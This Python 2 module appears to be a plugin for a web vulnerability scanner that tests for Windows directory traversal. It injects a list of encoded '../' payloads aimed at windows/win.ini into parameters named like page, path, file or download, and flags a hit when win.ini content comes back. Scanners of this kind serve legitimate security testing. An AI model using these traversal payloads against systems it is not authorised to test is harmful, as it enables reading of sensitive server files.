#!/usr/bin/python
# -*- coding: utf-8 -*-
import json

from engine.engine_utils.inj_functions import body_inject
from engine.engine_utils.params import query2dict, dict2query, db_params2dict
from engine.engine_utils.common import *
from urlparse import urlparse
from engine.logger import scanLogger as logger
from copy import deepcopy

inj_path_list = [
        "../../../../../../../../../../../../../windows/win.ini",
        "windows/win.ini",
        "/../../../../../../../../../../../../../windows/win.ini",
        "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini",
        "/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini",
        "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fwindows%252Fwin.ini",
        "/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini",
        "././././././././././././././././././././././././../../../../../../../../windows/win.ini",
        "/./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../windows/win.ini",
        ".%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/windows/win.ini",
        ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini"

]


def run_url(http, ob, item):
    header = {
        "Pragma": "no-cache",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "no-cache",
        "Cookie": ob.get('cookie') if ob.get('cookie') else '',
        "Connection": "keep-alive",
        "Host": ob['domain']
    }

    result = []
    try:
        url = item.get('url')
        params = item.get('params')
        method = item.get('method')
        source_ip = ob.get('source_ip')
        url_parse = urlparse(url)
        scheme = url_parse.scheme
        domain = url_parse.netloc
        path = url_parse.path
        query = url_parse.query
        if source_ip:
            domain = source_ip
        # 没有参数就不扫
        if not params and not query:
            return []
        # get方法
        if method.lower() == 'get':
            if params:
                query = params
            if query and re.search('page|download|path|file', query, re.I):
                query_dict = query2dict(query)
                for key in query_dict.keys():
                    if re.search('page|download|path|file', key, re.I):
                        for inj_value in inj_path_list:
                            query_bak = deepcopy(query_dict)
                            query_bak[key] = inj_value
                            new_query = dict2query(query_bak, isUrlEncode=False)
                            new_url = "%s://%s%s?%s" % (scheme, domain, path, new_query)
                            data = traversal_params(ob, http, new_url, 'GET', '', header)
                            if data:
                                result.extend(data)
                                break
        elif method.lower() == 'post':
            body_dict = db_params2dict(params)
            # 注入query，body不变
            if query and re.search('page|download|path|file', query, re.I):
                query_dict = query2dict(query)
                for key in query_dict.keys():
                    if re.search('page|download|path|file', key, re.I):
                        for inj_value in inj_path_list:
                            query_bak = deepcopy(query_dict)
                            query_bak[key] = inj_value
                            new_query = dict2query(query_bak, isUrlEncode=False)
                            new_url = "%s://%s%s?%s" % (scheme, domain, path, new_query)
                            data = traversal_params(ob, http, new_url, 'POST', dict2query(body_dict, isUrlEncode=False), header)
                            if data:
                                result.extend(data)
                                break
            if params and re.search('page|download|path|file', str(params), re.I):
                new_url = "%s://%s%s?%s" % (scheme, domain, path, query)
                for key in body_dict.keys():
                    if re.search('page|download|path|file', key, re.I):
                        for inj_value in inj_path_list:
                            body_bak = deepcopy(body_dict)
                            body_bak[key] = inj_value
                            new_body = dict2query(body_bak, isUrlEncode=False)
                            data = traversal_params(ob, http, new_url, 'POST', new_body, header)
                            if data:
                                result.extend(data)
                                break
    except Exception, e:
        logger.error("File:dir_traversal_win_url.py, run_url function :%s" % (str(e)))
    return result


def traversal_params(ob, http, new_url, method, body, header):
    data = []
    res, content = http.request(new_url, method, body=body, headers=header)
    if res and res.has_key('status') and res['status'] == '200':
        keyword = re.search(r'; for 16-bit app support', content)
        if keyword:
            response = getResponse(res, content)
            request = getRequest(new_url, domain=ob['domain'])
            detail = "存在任意文件读取漏洞"
            data.append(getRecord(ob, new_url, ob['level'], detail, request, response))
            return data
    return data
